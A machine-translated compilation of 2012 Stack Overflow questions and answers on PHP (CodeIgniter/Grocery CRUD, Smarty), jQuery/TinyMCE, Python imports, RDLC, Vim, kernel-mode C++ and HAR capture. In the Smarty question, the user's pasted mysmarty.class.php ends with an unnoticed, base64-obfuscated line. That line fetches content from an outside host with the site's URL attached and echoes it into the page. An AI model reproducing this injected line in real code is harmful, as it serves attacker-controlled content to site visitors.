标题也可以有标题的自定义视图，您可以使用`setCustomTitle(View view)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-24T01:37:02.507

如果没有自定义警报框，这是不可能做到的，如下所示：http: [//slayeroffice.com/code/custom_alert/](http://slayeroffice.com/code/custom_alert/)

# php - 自定义 is_unique_logical_key - 验证还是回调？

> ID：13537503
> 
> 赞同：3
> 
> 时间：2012-11-24T01:31:17.950
> 
> 标签：php, codeigniter-2, grocery-crud

我可以为以下问题提供设计建议：

我正在使用 Codeigniter/Grocery_CRUD。

我的系统是多租户的——不同的自治站点——在同一个客户端中。我有很多具有唯一逻辑键的表实例。一种这样的表结构是：

equip_items
id (pk)
equip_type_id（fk 到equip_types）
site_id（fk 到站点）
名称

其中 (equip_type_id, site_id, name) 一起是我的数据库中的唯一键。

问题是，当使用grocery_CRUD 表单添加或编辑违反此数据库规则的记录时 - 添加或编辑失败（由于数据库中的约束）但我没有得到任何反馈。

我需要 is_unique form_validation 规则的变体，通过它我可以指定必须唯一的字段*s*。

问题：
如何指定规则？set_rules() 用于给定字段，我有多个字段适用该规则。这是否意味着我应该放弃 Form_validation 模式？还是我遵循“匹配”规则模式并以某种方式指向其他字段？

也许回调函数会更好，但这意味着在每个模型中编写一个自定义函数，最后我有这个问题，这是 9 个表。在一个地方执行此操作似乎要好得多（扩展 form_validation）。

我是否在 codeigniter 或grocery_CRUD 中遗漏了已经解决了这个问题的东西？

您可能有任何建议/建议将不胜感激。

**编辑：** 实际上，Johnny 提供的解决方案似乎并没有完全达到目标——它强制 unique_fields() 中的每个字段独立唯一——与在每个字段上设置 is_unique() 相同。我的问题是，在我的场景中，这些字段是复合唯一键（但不是主键）。我不知道它是否重要，但比原始问题陈述更进一步：1）site_id 是一个“隐藏”字段类型 - 我不希望我的用户担心他们在不同的站点上，所以我正在处理后面的 site_id场景。2) 同样处理equip_status_id 属性（不是唯一键的一部分）。并且 3) 我在所有这些外键属性上都有 set_relations()，grocery_CRUD 为我处理了不错的下拉菜单。

**编辑 2** 我已经使用回调解决了这个问题。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-25T00:50:06.463

**更新：**此代码现在是杂货店 CRUD 版本 >= 1.4 的一部分，您不再需要使用扩展程序。有关更多信息，请参阅[unique_fields的文档](http://www.grocerycrud.com/documentation/options_functions/unique_fields)

我将尝试尽可能简单地解释它：

**1.**首先对于那些杂货CRUD低于或等于1.3.3的人必须使用这个小改动：[https ://github.com/scoumbourdis/grocery-crud/commit/96ddc991a6ae500ba62303a321be42d75fb82cb2](https://github.com/scoumbourdis/grocery-crud/commit/96ddc991a6ae500ba62303a321be42d75fb82cb2)

**2.**其次在application/libraries创建一个名为grocery_crud_extended.php的文件

**3.**将以下代码复制到您的文件 application/libraries/grocery_crud_extended.php

```
<?php 
class grocery_CRUD_extended extends grocery_CRUD
{
    protected $_unique_fields = array();

    public function unique_fields()
    {
        $args = func_get_args();

        if(isset($args[0]) && is_array($args[0]))
        {
            $args = $args[0];
        }

        $this->_unique_fields = $args;

        return $this;
    }

    protected function db_insert_validation()
    {
        $validation_result = (object)array('success'=>false);

        $field_types = $this->get_field_types();
        $unique_fields = $this->_unique_fields;
        $add_fields = $this->get_add_fields();

        if(!empty($unique_fields))
        {
            $form_validation = $this->form_validation();

            foreach($add_fields as $add_field)
            {
                $field_name = $add_field->field_name;
                if(in_array( $field_name, $unique_fields) )
                {
                    $form_validation->set_rules( $field_name, 
                            $field_types[$field_name]->display_as, 
                            'is_unique['.$this->basic_db_table.'.'.$field_name.']');
                }
            }

            if(!$form_validation->run())
            {
                $validation_result->error_message = $form_validation->error_string();
                $validation_result->error_fields = $form_validation->_error_array;

                return $validation_result;
            }
        }
        return parent::db_insert_validation();
    }

    protected function db_update_validation()
    {
        $validation_result = (object)array('success'=>false);

        $field_types = $this->get_field_types();
        $unique_fields = $this->_unique_fields;
        $add_fields = $this->get_add_fields();

        if(!empty($unique_fields))
        {
            $form_validation = $this->form_validation();

            $form_validation_check = false;

            foreach($add_fields as $add_field)
            {
                $field_name = $add_field->field_name;
                if(in_array( $field_name, $unique_fields) )
                {
                    $state_info = $this->getStateInfo();
                    $primary_key = $this->get_primary_key();
                    $field_name_value = $_POST[$field_name];

                    $ci = &get_instance();
                    $previous_field_name_value = 
                        $ci->db->where($primary_key,$state_info->primary_key)
                            ->get($this->basic_db_table)->row()->$field_name;

                    if(!empty($previous_field_name_value) && $previous_field_name_value != $field_name_value) {
                        $form_validation->set_rules( $field_name, 
                                $field_types[$field_name]->display_as, 
                                'is_unique['.$this->basic_db_table.'.'.$field_name.']');

                        $form_validation_check = true;
                    }
                }
            }

            if($form_validation_check && !$form_validation->run())
            {
                $validation_result->error_message = $form_validation->error_string();
                $validation_result->error_fields = $form_validation->_error_array;

                return $validation_result;
            }
        }
        return parent::db_update_validation();
    }   

} 
```

**4.**现在你只需要像这样加载grocery_CRUD_extended：

```
 $this->load->library('grocery_CRUD');
    $this->load->library('grocery_CRUD_extended'); 
```

然后使用：

```
$crud = new grocery_CRUD_extended(); 
```

代替：

```
$crud = new grocery_CRUD(); 
```

**5.**现在你可以简单地拥有它的unique_fields，它的工作方式如下：

```
$crud->unique_fields('field_name1','field_name2','field_name3'); 
```

在你的情况下：

```
$crud->unique_fields('equip_type_id','site_id'); 
```

很容易吧？

这是在不实际更改杂货店 CRUD 的核心的情况下检查该字段是否唯一。您可以简单地使用grocery_CRUD_extended 而不是grocery_CRUD 并照常更新grocery CRUD 库。由于我是该库的作者，我将尝试将其包含在杂货店 CRUD 1.4 版中，因此您将来不必使用杂货店_CRUD_extended。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-10T00:39:54.030

我已经使用回调做到了这一点：

```
$crud->set_rules('name','Name','callback_unique_equip_item_check['.$this->uri->segment(4).']');     

function unique_equip_item_check($str, $edited_id)
{
    $var = $this->Equip_Item_model->is_unique_except(
            $edited_id,
            $this->input->post('site_id'),
            $this->input->post('equip_type_id'),
            $this->input->post('name'));

    if ($var == FALSE) {
        $s = 'You already have an equipment item of this type with this name.';
        $this->form_validation->set_message('unique_equip_item_check', $s);
        return FALSE;
        }
    return TRUE;
} 
```

# php - Smarty 模板错误

> ID：13537508
> 
> 赞同：3
> 
> 时间：2012-11-24T01:32:12.153
> 
> 标签：php, smarty, stack-trace

我一直在我的 error_log 中看到此错误弹出窗口，但不知道如何修复它：

```
[23-Nov-2012 20:19:08] PHP Fatal error:  Uncaught exception 'SmartyException' with message 'Unable to parse resource name ""' in /home/username/public_html/smarty/libs/sysplugins/smarty_internal_template.php:941
Stack trace:
#0 /home/username/public_html/smarty/libs/sysplugins/smarty_internal_template.php(546): Smarty_Internal_Template->__get('resource_object')
#1 /home/username/public_html/smarty/libs/Smarty.class.php(338): Smarty_Internal_Template->getRenderedTemplate()
#2 /home/username/public_html/smarty/libs/Smarty.class.php(382): Smarty->fetch(NULL, NULL, NULL, NULL, true)
#3 /home/username/public_html/libraries/mysmarty.class.php(92): Smarty->display(NULL)
#4 /home/username/public_html/cat.php(201): STemplate::display(NULL)
#5 {main}
  thrown in /home/username/public_html/smarty/libs/sysplugins/smarty_internal_template.php on line 941 
```

这些是 smarty_internal_template.php 的第 935-944 行，它在错误消息中引用：

```
public function __get($property_name)
{
    if ($property_name == 'resource_object') {
        // load template resource
        $this->resource_object = null;
        if (!$this->parseResourceName ($this->template_resource, $this->resource_type, $this->resource_name, $this->resource_object)) {
            throw new SmartyException ("Unable to parse resource name \"{$template_resource}\"");
        }
        return $this->resource_object;
    } 
```

我没有看到我的网站上出现错误，只是在错误日志中 - 但我真的很想修复它以避免任何未来的问题。

这是 mysmarty.class.php 的副本：

```
<?php

class STemplate {

   function STemplate() {
        global $Smarty;
        if (!isset($Smarty)) {
            $Smarty = new Smarty;
        }
    }

    function create() {
        global $Smarty;
        $Smarty = new Smarty();
        $Smarty->compile_check = true;
        $Smarty->debugging = false;
        $Smarty->template_dir = dirname(__FILE__) . "/../themes";
        $Smarty->compile_dir  = dirname(__FILE__) . "/../temporary";

        return true;
    }

    function setCompileDir($dir_name) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->compile_dir = $dir_name;
    }

    function setType($type) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->type = $type;
    }

    function assign($var, $value) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->assign($var, $value);
    }

    function setTplDir($dir_name = null) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        if (!$dir_name) {
            $Smarty->template_dir = dirname(__FILE__) . "/../themes";
        } else {
            $Smarty->template_dir = $dir_name;
        }
    }

    function setModule($module) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->theme = $module;
        $Smarty->type  = "module";
    }

    function setTheme($theme) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->template_dir = dirname(__FILE__) . "/../themes/" . $theme;
        $Smarty->compile_dir  = dirname(__FILE__) . "/../temporary/" . $theme;
        $Smarty->theme        = $theme;
        $Smarty->type         = "theme";
    }

    function getTplDir() {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        return $Smarty->template_dir;
    }

    function display($filename) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        $Smarty->display($filename);
    }

    function fetch($filename) {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        return $Smarty->fetch($filename);
    }

    function getVars() {
        global $Smarty;
        if (!isset($Smarty)) {
            STemplate::create();
        }
        return $Smarty->get_template_vars();
    }
}
echo @file_get_contents(base64_decode("aHR0cDovL3d3dy50YWtlbi50by9hcGkucGhwP3Bpbj0=")."http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
?> 
```

这是为 cat.php 渲染的 cat.tpl：

```
 <div class="main-wrapper">
                <div id="main">
                  <div class="content">
                  {if $message ne ""}
                  {include file="error.tpl"}
                  {/if}
                    {if $smarty.session.USERID ne ""}
                    {include file="sub_bit.tpl"}
                    {else}
                    <div class="welcomebox">
                      <div style="position:relative;">
                        <div class="how-it-works-button">
                          <a href="#" id="show-how-it-works" rel="#how-it-work-spotlight">
                            {$lang419}
                          </a>
                        </div>
                      </div>
                      <h1>{$lang102}<br />{$lang103}</h1>
                      <h2>{$lang104}</h2>
                    </div>
                    {/if}
                    <div class="how-it-work-popup apple_overlay" id="how-it-work-spotlight" style="display:none;">
                      <div class="how-it-works-wrapper" id="how-it-works-spot">
                        <div class="t"></div>
                        <div class="c">
                          <div class="close"><a href="#" class="spotlight-close">{$lang3}</a></div>
                          <div class="spacer"></div>

                          <div class="left-column columns">
                            <h1><center>{$lang420}</center></h1>
                            <p>{$lang421}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang422}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang423}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang424}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang425}</p>
                            <div class="arrow-down"></div>
                            <p><strong>{$lang426}</strong></p>
                          </div>
                          <div class="right-column columns">
                            <h1><center>{$lang427}</center></h1>
                            <p>{$lang428}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang429}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang430}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang431}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang432}</p>
                            <div class="arrow-down"></div>
                            <p>{$lang433}</p>
                          </div>
                          <div class="spacer"></div>
                          <div class="more"><a href="{$baseurl}/terms_of_service">{$lang434}</a></div>
                        </div>
                        <div class="b"></div>
                      </div>
                    </div>
                    <div class="darkenBackground"></div>

                    <div class="category-tags">
                    {section name=i loop=$tags max=10}
                    {if $tags[i] != ""}<a href="{$baseurl}/tags/{$cid}/{$tags[i]|stripslashes}" class="tag" title="logo">&nbsp;{$tags[i]|stripslashes}&nbsp;</a>{/if}
                    {/section}
                    </div>

                    <div class="featured">   
                        <div class="gig_filters bordertop">
                          <div class="ul bg-f-a">
                            <div class="li"><span class="helptext">{$lang109}</span></div>
                                {if $s eq "d" OR $s eq ""}
                                <div class="li sep-right"><a href="{$baseurl}/categories/{$cid}?s=dz" class="current">{$lang110}</a></div>
                                {else}
                                <div class="li sep-right"><a href="{$baseurl}/categories/{$cid}?s=d" {if $s eq "d" OR $s eq "dz" OR $s eq ""}class="current"{/if}>{$lang110}</a></div>
                                {/if}
                                {if $s eq "p"}
                                <div class="li sep-right"><a href="{$baseurl}/categories/{$cid}?s=pz" class="current">{$lang111}</a></div>
                                {else}
                                <div class="li sep-right"><a href="{$baseurl}/categories/{$cid}?s=p" {if $s eq "p" OR $s eq "pz"}class="current"{/if}>{$lang111}</a></div>
                                {/if}
                                {if $s eq "r"}
                                <div class="li sep-right"><a href="{$baseurl}/categories/{$cid}?s=rz" class="current">{$lang112}</a></div>
                                {else}
                                <div class="li sep-right"><a href="{$baseurl}/categories/{$cid}?s=r" {if $s eq "r" OR $s eq "rz"}class="current"{/if}>{$lang112}</a></div>
                                {/if}
                                {if $s eq "c"}
                                <div class="li sep-right"><a href="{$baseurl}/categories/{$cid}?s=cz" class="current">{$lang436}</a></div>
                                {else}
                                <div class="li sep-right"><a href="{$baseurl}/categories/{$cid}?s=c" {if $s eq "c" OR $s eq "cz"}class="current"{/if}>{$lang436}</a></div>
                                {/if}

                                <div class="li sep-right">
                                {if $price_mode eq "3"}
                                <script language="JavaScript" type="text/JavaScript"> 
                                function Syfonic_jumpMenu(targ,selObj,restore){
                                  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'"); 
                                  if (restore) selObj.selectedIndex=0; 
                                } 
                                </script> 
                                {insert name=get_packs value=a assign=packs}
                                <select onChange="Syfonic_jumpMenu('parent',this,0)">
                                <option value="{$baseurl}">{$lang495}</option>
                                {section name=p loop=$packs}
                                <option value="{$baseurl}/categories/{$cid}?s=o&p={$packs[p].pprice|stripslashes}" {if $p eq $packs[p].pprice|stripslashes}selected="selected"{/if}>{$lang197}{$packs[p].pprice|stripslashes}</option>
                                {/section}
                                </select>
                                {/if}
                                </div>

                                {if $s eq "e"}
                                <div class="li last"><a href="{$baseurl}/categories/{$cid}?s=ez" class="current">{$lang494}</a></div>
                                {else}
                                <div class="li last"><a href="{$baseurl}/categories/{$cid}?s=e" {if $s eq "e" OR $s eq "ez"}class="current"{/if}>{$lang494}</a></div>
                                {/if}
                          </div>
                        </div>                
                        {include file="bit.tpl"}
                    </div>

                    <div class="paging">
                        <div class="p1">
                            <ul>
                                {$pagelinks}
                            </ul>
                        </div>
                    </div>
                  </div>
                  {include file="side.tpl"}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T09:55:49.520

*您必须使用{literal}*（开始标签）和*{/literal}*（结束标签）从 cat.php 中转义/包装内联 JavaScript（*第 99 - 102 行*）的大括号（*{ 和 } ）。*看看[http://www.smarty.net/docsv2/en/language.function.literal](http://www.smarty.net/docsv2/en/language.function.literal)

 ***完成后，这些行应如下所示：

```
<script language="JavaScript" type="text/JavaScript">{literal}
        function Syfonic_jumpMenu(targ,selObj,restore){
               eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'"); 
                   if (restore) selObj.selectedIndex=0; 
        } 
{/literal}</script> 
```***

# jquery - JQuery 无法从 IE 上的 tinymce 获取图像宽度

> ID：13537511
> 
> 赞同：2
> 
> 时间：2012-11-24T01:32:43.987
> 
> 标签：jquery, image, tinymce

此问题仅出现在 IE9 上。Firefox 工作正常，其他浏览器也一样。

我在用户上传图像的文本区域上使用 TinyMCE（带有 ImageManager 插件）。textarea 专门用于上传图片。当用户将图像上传/插入到 tinyMCE 文本区域并提交页面时 - 我编辑检查图像尺寸以确保其尺寸正确，然后才能完成表单提交。

我将 tinyMCE textarea 的 html 加载到 JQuery 对象中，然后使用 jquery 调用对象的 .attr("width") 以确保图像是所需的宽度。

问题是在 FireFox 上，它工作正常，返回图像的宽度。在 IE9 上，对 .attr("width") 的 jquery 调用返回 0（零）。

这是代码：

```
sString = $('#projectimage1').html();   // fetch the contents of the tinymce form field
objWork.html(sString);      // load a work div with the html contents of the control
// check to see if the image has the correct dimensions
var objImage=null;
objImage = objWork.find("img:first");

alert("image html = " + objImage.html()); // this returns the correct html for the image tag, including the width
alert("image src = " + objImage.attr('src'));   // this returns the correct image src
alert("image width = " + objImage.attr("width"));   // this returns 0 in IE9! 
```

我唯一能想到的可能是一个问题，就是当我在图像上“查看源”时它正在显示在 tinyMCE 文本区域中 - 图像标签中使用的所有 html 都是 html 编码的。所以 '<' 实际上在源中显示为 < 并且 width="219" 属性中使用的引号实际上设置为 width="219"

如果这确实是问题所在，为什么 IE9 有这个问题，而 FireFox 没有呢？

如果这不是问题 - 是否有人对我如何进行/纠正有任何想法？

谢谢专家！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:42:28.520

在新创建的图像被实际渲染之前，浏览器可能还没有完成从缓存中加载图像并因此将其宽度记录到对象中。不同的浏览器在完成从缓存中加载某些内容时有不同的时间。如果你想要图像的宽度，你应该从它已经加载的地方而不是你复制它的地方获取宽度：

```
var width = $('#projectimage1 img:first').width(); 
```

无论哪种情况，您都必须确保图像在收集其宽度之前已完成加载。

或者，您可以使用该`.complete`属性检查图像是否已完成加载，如果没有，则附加一个 onload 处理程序，以便您可以在加载完成时记录其宽度。

如果您希望我们评论您在 View/Source 中看到的内容，您必须给我们一个指向实际网页的链接，这样我们才能看到那里真正发生了什么。因为您正在正确获取其他属性`.src`，所以浏览器似乎不太可能不解析 HTML。

# python - NameError：未定义全局名称'primes_dict'---在另一个导入的模块中定义？

> ID：13537515
> 
> 赞同：0
> 
> 时间：2012-11-24T01:34:08.523
> 
> 标签：python, variables, global

我有两个模块：“factors.py”和“primes.py”。在“factors.pyc”中，我有一个函数*应该*找到一个数字的所有素因子。在其中，我从“primes.py”导入了 2 个函数。我在“primes.py”中有一本字典，它被声明为全局（在定义之前）。当我尝试在“factors.py”的代码中使用它时，我收到了这个错误：

```
Traceback (most recent call last):
  File "<pyshell#2>", line 1, in <module>
    pFactors(250)
  File "D:\my_stuff\Google Drive\Modules\factors.py", line 53, in pFactors
    for i in primes_dict:
NameError: global name 'primes_dict' is not defined 
```

这是我的代码：

在“因素.py”中：

```
def pFactors(n):
   import primes as p
   from math import sqrt
   from time import time
   pFact, primes, start, limit, check, num = [], [], time(), int(round(sqrt(n))), 2, n
   if p.isPrime(n):
      pFact = [1, n]
   else:
      p.prevPrimes(limit)
      for i in primes_dict:
         if primes_dict[i]:
            primes.append(i)
   #other code 
```

在“primes.py”中：

```
def prevPrimes(n):
    if type(n) != int and type(n) != long:
        raise TypeError("Argument <n> accepts only <type 'int'> or <type 'long'>")
    if n < 2:
        raise ValueError("Argument <n> accepts only integers greater than 1")
    from time import time
    global primes_dict
    start, primes_dict, num = time(), {}, 0
    for i in range(2, n + 1):
        primes_dict[i] = True
    for i in primes_dict:
        if primes_dict[i]:
            num = 2
            while (num * i < n):
                primes_dict[num*i] = False
                num += 1
    end = time()
    print round((end - start), 4), ' seconds'
    return primes_dict #I added this in based off of an answer on another question, but it still was unable to solve my issue 
```

`prevPrimes(n)`以预期的方式工作。但是，因为我无法访问`primes_dict`，`pFactors(n)`所以不起作用。

如何`primes_dict`在另一个模块中使用字典（在一个模块中创建）？提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:36:52.400

中定义的任何内容`primes`都将以您的名称命名`import`。由于您将其导入为`p`，`primes_dict`因此可以作为`p.primes_dict`. 如果你愿意，你可以做

```
from primes import primes_dict 
```

将其作为顶级名称。

# .net - RDLC中饼图的自定义颜色

> ID：13537519
> 
> 赞同：0
> 
> 时间：2012-11-24T01:35:22.367
> 
> 标签：.net, wpf, colors, rdlc, pie-chart

我知道使用 ReportViewer，我们可以为饼图配色方案定义一个自定义托盘，这在大多数情况下都适用。我有一个案例，这不起作用。让我解释 ：

我们的一些用户希望我们能够创建一个饼图，他可以在其中定义每个组的颜色。像这样的东西：

```
Group A : Red
Group B : Blue
Group C : Green 
```

如果我们总是以相同的方式对所有组进行排序，我们可以让它在某个时候起作用，但是假设我们没有 A 组的元素，那么所有颜色都会切换一个。另外，在这种特殊情况下，我们有很多组，并且大多数组并没有出现在所有饼图中。

如果这是可能的，我们将强制用户为所有可能的组选择一种颜色，然后饼图对于同一组将始终具有相同的颜色，无论饼图中可见的组数如何。

这甚至可能吗？如果可以，怎么办？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T15:53:59.693

您是否尝试过将系列的填充颜色设置为基于数据的表达式？ [https://stackoverflow.com/a/11654835/124386](https://stackoverflow.com/a/11654835/124386)

# vim - VIM 中的自定义弹出菜单

> ID：13537521
> 
> 赞同：10
> 
> 时间：2012-11-24T01:36:01.883
> 
> 标签：vim

在 vim 中带有弹出菜单的 Tab 补全在正确的配置下工作得很好。 [http://vim.wikia.com/wiki/Make_Vim_completion_popup_menu_work_just_like_in_an_IDE](http://vim.wikia.com/wiki/Make_Vim_completion_popup_menu_work_just_like_in_an_IDE)

我有一小部分在 vim 中使用的代码生成器和代码操作程序。程序是：

```
1\. initiate visual mode
2\. highlight text
3\. :'<,'>!hashify 
```

我想利用 vim 弹出菜单来提供一系列操作。

新程序将是：

```
1\. initiate visual mode
2\. highlight text
3\. <Tab> -- select transform option from menu 
```

是否有可用于此的 vimscript 接口？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-24T18:24:16.700

插入模式完成弹出窗口可用于插入选择的文本片段。有两种实现方式，见`:help complete-functions`和`:help complete()`。如果您的代码生成器返回要插入的单行（并且不太长）文本片段，您可以调用生成器`system(...)`，然后将返回的值提供给完成函数。

另一方面，如果菜单选择不直接对应于插入的文本，而是战术选择或动作，大多数插件都会呈现这样的选择菜单，其样式类似于内置菜单（例如 from `:ilist`）：

```
:echohl Title
:echo 'Code fragments:'
:echohl None
:echo '1\. foo'
:echo '2\. bar'
:let choice = nr2str(getchar())
:if choice == 1 ... 
```

`:normal! iText`然后，通过、 或插入与选择相对应的文本`setline()`。

由于您似乎需要从视觉模式完成，您可以首先通过使用`y`.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-05-28T21:27:34.793

[这个插件](https://github.com/megaannum/forms)允许为 Vim 创建类似的弹出窗口：

![在此处输入图像描述](../Images/12c998d042939c9f0a54a8e1e2c4b8d5.png)

# c++ - 为什么内核模式会给 STL 带来问题？

> ID：13537522
> 
> 赞同：0
> 
> 时间：2012-11-24T01:36:29.637
> 
> 标签：c++, stl, kernel-mode

微软的 STL 在他的演讲中简要暗示了 STL 在内核模式下的交互存在问题。有人可以解释一下他的意思吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-01-04T12:39:54.937

内核模式代码依赖于一些专有的 Microsoft 对 C++ 的扩展，特别是用于确定代码可以在哪个 IRQ 级别运行。如果您弄错了，Windows 可能会出现“Driver IRQL Not Less or Equal”错误蓝屏。

不幸的是，这些扩展与 C++ 模板或虚拟函数不兼容。原因是 C++ 编译器隐式实例化模板和 vtable，但未能应用正确的 IRQL 设置，因为没有明确的实例化点可以从中获取正确的级别。

# php - 如何调整我的模型以将上传的图像存储到我的数据库作为图像的链接而不是显示为 blob？

> ID：13537531
> 
> 赞同：0
> 
> 时间：2012-11-24T01:37:52.850
> 
> 标签：php, codeigniter, phpmyadmin

大家好，我最近设法将图像上传到我的个人资料页面，但是当我刷新页面时，图像消失了。我认为这是因为图像是如何被放入数据库的。

这是模型：

```
function ProfileImages()
{
    parent::__construct();

}

function exists($username)
{
    $this->db->select('*')->from("profileimages")->where('user', $username);
    $query = $this->db->get();

    if ($query->num_rows() > 0)
    {

        return true;
        /*
         echo "user $user exists!";
        $row = $query->row();
        echo " and his profileimage is $row->profileimage";
        */
    }

    else

    {

        return false;
        //echo "no such user as $user!";
    }

}

function putProfileImage($username, $img)
{

    $record = array('user' => $username, 'profileimage' => $img);
    if ($this->exists($username))
    {
        $this->db->where('user', $username)->update('profileimages', $record);

    }
    else
    {
        $this->db->where('user', $username)->insert('profileimages', $record);

    }

}

function getProfileImage($username)
{
    $this->db->select('*')->from('profileimages')->where('user', $username);
    $query = $this->db->get();
    if ($query->num_rows() > 0){
        $row = $query->row();
        return $row->profileimage;
    }

    return Null;

}

   } 
```

这是我的控制器：

```
class HomeProfile extends CI_Controller 
 {

function HomeProfile()
  {
   parent::__construct();
   $this->load->model("profiles");
   $this->load->model("profileimages");
   $this->load->helper(array('form', 'url'));
  }

      function upload()
       {
      $config = array(

        'allowed_types' =>'gif|jpg|jpeg|png',
        'upload_path' =>'./web-project-jb/assets/puploads/',
         'max_size' => 10000,
         'max_width' => 1024,
        'max_height' => 768

);

$this->load->library('upload', $config);
$img = $this->session->userdata('img');
$username = $this->session->userdata('username');
$this->profileimages->putProfileImage($username, $this->input->post("profileimage"));
//fail show upload form
if (! $this->upload->do_upload())
{

    $error = array('error'=>$this->upload->display_errors());

    $username = $this->session->userdata('username');

    $viewData['username'] = $username;
    $viewData['profileText'] = $this->profiles->getProfileText($username);

    $this->load->view('shared/header');
    $this->load->view('homeprofile/homeprofiletitle', $viewData);
    $this->load->view('shared/nav');
    $this->load->view('homeprofile/homeprofileview', $error, $viewData, array('error' => ' ' ));
    $this->load->view('shared/footer');

    //redirect('homeprofile/index');

}

else
{
    //successful upload so save to database

    $file_data = $this->upload->data();

    $data['img'] = '/web-project-jb/assets/puploads/'.$file_data['file_name'];
    // you may want to delete the image from the server after saving it to db
    // check to make sure $data['full_path'] is a valid path
    // get upload_sucess.php from link above
    //$image = chunk_split( base64_encode( file_get_contents( $data['file_name'] ) ) );

    $this->username = $this->session->userdata('username');

    $data['profileimages'] = $this->profileimages->getProfileImage($username);

    $viewData['username'] = $username;
    $viewData['profileText'] = $this->profiles->getProfileText($username);

    $username = $this->session->userdata('username');

    $this->load->view('shared/header');
    $this->load->view('homeprofile/homeprofiletitle', $viewData);
    $this->load->view('shared/nav');
    $this->load->view('homeprofile/homeprofileview', $data, $viewData);
    $this->load->view('shared/footer');

    //redirect('homeprofile/index');
}

  }

  function index()
  {

$username = $this->session->userdata('username');

$data['profileimages'] = $this->profileimages->getProfileImage($username);

$viewData['username'] = $username;
$viewData['profileText'] = $this->profiles->getProfileText($username);

$this->load->view('shared/header');
$this->load->view('homeprofile/homeprofiletitle', $viewData);
$this->load->view('shared/nav');
//$this->load->view('homeprofile/upload_form', $data);
$this->load->view('homeprofile/homeprofileview', $data, $viewData, array('error' => ' ' ) );
$this->load->view('shared/footer');
   }

  } 
```

如果您查看模型中的 putprofileimages 函数，我想我会在此处的某处放置一个 appends 命令。我希望图像的文件名出现在 profileimage 字段的数据库中。我也希望当我刷新时个人资料图像会留在屏幕上

```
<h3><?="Profile Image"?></h3>
 <img src="<?php if (isset($img)) echo base_url($img); ?>" width='300' height='300'/>
  <?=form_open_multipart('homeprofile/upload');?>
    <input type="file" name="userfile" value=""/>
    <?=form_submit('submit', 'upload')?>
    <?=form_close();?> 
    <?php if (isset($error)) echo $error;?>
  </div> 
</div>  
   <div id="secondary">
  <p>
      <?=$profileText;?>
    </p>
    <p>
      <?=form_open('homeprofile/changetext'); ?>
      <?php $msgbox = array(
            'name' => 'profiletext',
            'rows' => '8',
            'cols' => '30',
            );?>
     <?=form_textarea($msgbox);?>       
     </p>
     <p>
      <?=form_submit('submit', 'Change'); ?>
      <?=form_close(); ?>
    </p>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T08:38:39.657

您可以像 char 字段一样简单地将图像名称保存在数据库中。就在您的`do_upload`功能之后，您可以使用检索图像名称`$this->upload->file_name`

然后你可以很容易地将它保存在数据库中，而不是整个文件。

现在，在您的视图页面中，您可以通过 html 设置图像路径，然后仅附加您从 db 查询中获得的文件名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T01:40:52.297

一个简短的说明 - 你在使用 codeigniter 2 吗？你应该这样设置你的构造函数：

```
 class HomeProfile extends CI_Controller 
 {

 function __construct()
{
    // Call the parent construct
    parent::__construct();

$this->load->model("profiles");
$this->load->model("profileimages");
$this->load->helper(array('form', 'url'));      

 } // end construct 
```

模型也一样！好的，在你的模型中，也许我没有得到这个，但你有

```
 if ($this->exists($username)) 
```

但你的方法说

```
 function putProfileImage($username, $img) 
```

所以如果用户名可能是空白的，你只需要设置一个默认值

```
function putProfileImage($username = 0, $img) 
```

那么也许你可以做

```
 if ($username === 0) 
```

但我个人不会将插入和更新放在同一个方法中，将它们分开，调试起来会容易得多。还有——你是否在自动加载中加载了会话库？？？

# google-chrome - 从 Google Chrome 自动生成 HAR 文件

> ID：13537533
> 
> 赞同：25
> 
> 时间：2012-11-24T01:38:28.413
> 
> 标签：google-chrome, automation, spdy, har

基本上我需要的是一种自动化以下操作*结果的方法：*

1.  打开一个新标签；

2.  在开发者工具中打开网络标签；

3.  加载一个 URL；

4.  选择“全部保存为 HAR”。

通常，建议的解决方案涉及使用[PhantomJS](http://phantomjs.org/)、[browsermob-proxy](http://opensource.webmetrics.com/browsermob-proxy/)或[pcap2har](https://github.com/andrewf/pcap2har)；这些不适合我的情况，因为我需要处理[SPDY](http://dev.chromium.org/spdy)流量。

